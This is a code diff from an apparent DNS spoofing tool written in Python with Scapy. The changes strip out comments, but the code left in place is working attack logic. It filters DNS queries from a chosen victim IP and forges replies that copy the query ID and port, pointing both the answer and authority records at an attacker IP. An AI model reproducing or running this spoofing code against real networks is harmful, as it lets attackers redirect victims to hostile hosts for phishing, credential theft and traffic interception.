@@ -20,11 +20,7 @@ class DNSSpoofer:
         """Spoof DNS responses for DNS queries."""
         if pkt.haslayer(DNS) and pkt[IP].src == self.victim_ip :
             qname = pkt[DNSQR].qname.decode()
-            # print("DNS PACKET",qname)
-
-            # Check for the domain you want to spoof
-            #if b"example.com" in qname:  
-            # Create the DNS response
+       
             if self.domain :
                
                 if self.domain.strip().lower() in qname :
@@ -32,9 +28,9 @@ class DNSSpoofer:
                         IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                         UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                         DNS(
-                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
-                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Spoofed response
-                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Authority section
+                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  
+                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  
+                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  
                         )
                     )
                     # Send the spoofed DNS response to the victim
@@ -45,9 +41,9 @@ class DNSSpoofer:
                         IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                         UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                         DNS(
-                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
-                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Spoofed response
-                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Authority section
+                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  
+                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  
+                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  
                         )
                     )
                 # Send the spoofed DNS response to the victim
